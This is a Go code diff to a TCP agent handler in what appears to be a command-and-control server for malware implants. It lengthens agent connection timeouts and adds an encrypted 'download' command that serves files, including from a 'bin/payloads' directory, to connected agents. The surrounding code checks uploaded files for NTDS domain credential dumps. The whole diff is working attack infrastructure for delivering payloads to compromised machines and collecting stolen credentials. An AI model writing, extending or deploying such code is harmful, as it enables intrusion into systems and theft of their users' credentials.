@@ -215,7 +215,7 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 	disconnectReason := "connection closed"
 	beaconLoop:
 	for {
-		conn.SetDeadline(time.Now().Add(10 * time.Minute))
+		conn.SetDeadline(time.Now().Add(4 * time.Hour))
 		frame, err := tcpReadFrame(conn)
 		if err != nil {
 			disconnectReason = err.Error()
@@ -391,6 +391,56 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 			go s.CheckAndPromptNTDS(agentID, filename)
 			if err := tcpWriteAck(conn, true, ""); err != nil {
 				disconnectReason = fmt.Sprintf("write upload ACK: %v", err)
+				break beaconLoop
+			}
+
+		case "download":
+			// Always respond with "dl_resp" (never "ack") so the client's
+			// tcp_recv_enc("dl_resp") never sees a type mismatch that would
+			// trigger tcp_reset() and drop the connection.
+			var dlData []byte
+			plain, err := tcpOpenPayload(msg, key)
+			if err == nil {
+				var dreq struct {
+					Filename string `json:"filename"`
+				}
+				if jsonErr := json.Unmarshal(plain, &dreq); jsonErr == nil && dreq.Filename != "" {
+					name := filepath.Base(dreq.Filename)
+					for _, dir := range []string{
+						filepath.Join(s.cfg.DataDir, "downloads"),
+						filepath.Join(s.cfg.DataDir, "uploads"),
+						filepath.Join(projectRoot(), "bin", "payloads"),
+					} {
+						if d, readErr := os.ReadFile(filepath.Join(dir, name)); readErr == nil {
+							dlData = d
+							break
+						}
+					}
+					if dlData == nil {
+						s.printf("[!] TCP agent %s: download: file not found: %s\n", agentID[:8], name)
+					}
+				} else {
+					s.printf("[!] TCP agent %s: invalid download JSON: %v\n", agentID[:8], jsonErr)
+				}
+			} else {
+				s.printf("[!] TCP agent %s: invalid download payload: %v\n", agentID[:8], err)
+			}
+			// Send "dl_resp" with base64 data (empty string means not found / error).
+			dlResp := struct {
+				Data string `json:"data"`
+			}{Data: base64.StdEncoding.EncodeToString(dlData)}
+			dlJSON, _ := json.Marshal(dlResp)
+			dlEnc, encErr := Seal(key, dlJSON)
+			if encErr != nil {
+				disconnectReason = fmt.Sprintf("download: encrypt failed: %v", encErr)
+				break beaconLoop
+			}
+			dlOut, _ := json.Marshal(tcpMsg{
+				Type:    "dl_resp",
+				Payload: json.RawMessage(`"` + base64.StdEncoding.EncodeToString(dlEnc) + `"`),
+			})
+			if err := tcpWriteFrame(conn, dlOut); err != nil {
+				disconnectReason = fmt.Sprintf("write download resp: %v", err)
 				break beaconLoop
 			}
 
